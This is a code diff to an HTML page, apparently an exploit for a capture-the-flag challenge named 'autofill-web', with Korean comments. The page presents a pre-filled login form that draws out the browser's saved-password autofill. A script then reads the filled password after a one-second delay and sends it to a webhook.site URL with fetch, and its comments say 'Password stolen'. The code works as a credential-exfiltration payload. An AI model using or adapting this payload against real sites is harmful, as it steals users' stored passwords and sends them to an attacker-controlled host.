@@ -6,6 +6,7 @@
 <body>
     <h1>Please wait, loading configuration...</h1>
 
+    <!-- 1. 자동 완성을 유발하는 모든 속성이 포함된 완전한 폼 -->
     <form id="login-form" action="https://autofill-web.k17.kctf.cloud/login" method="POST">
         <label for="username">Username:</label>
         <input type="text" id="username" name="username" value="admin" autocomplete="username">
@@ -18,25 +19,25 @@
 
     <script>
         // (중요) 이 URL을 당신의 Webhook.site URL로 반드시 교체하세요!
-        const webhookUrl = 'https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3';
-        const form = document.getElementById('login-form');
+        const webhookUrl = 'https://webhook.site/YOUR_UNIQUE_WEBHOOK_ID';
 
-        form.addEventListener('submit', (event) => {
-            // 1. (핵심) 폼 제출을 막아 페이지가 절대 이동하지 않도록 합니다.
-            event.preventDefault();
-
+        // 2. 요청 전송이 성공했던 setTimeout 방식으로 되돌립니다.
+        // 봇이 상호작용하는 시간(1초)에 맞춰 지연 시간을 설정합니다.
+        setTimeout(() => {
             const stolenPassword = document.getElementById('password').value;
 
+            // 자동 완성이 성공했는지 확인
             if (stolenPassword) {
-                console.log("Password stolen. Sending to webhook:", stolenPassword);
-                // 2. 훔친 비밀번호를 보내기만 하고, 더 이상 아무것도 하지 않습니다.
-                // 이렇게 하면 fetch 요청이 취소될 걱정이 없습니다.
+                console.log("Password stolen:", stolenPassword);
+                // 훔친 비밀번호를 Webhook으로 전송
                 fetch(`${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`);
             } else {
-                console.log("Submit triggered, but password field is empty.");
-                fetch(`${webhookUrl}?error=autofill_failed_final`);
+                console.log("Autofill failed. Password field is still empty.");
+                // 디버깅을 위해 실패 메시지를 전송
+                fetch(`${webhookUrl}?error=autofill_failed_with_autocomplete`);
             }
-        });
+        }, 1000); // 1초 지연
+
     </script>
 </body>
 </html>
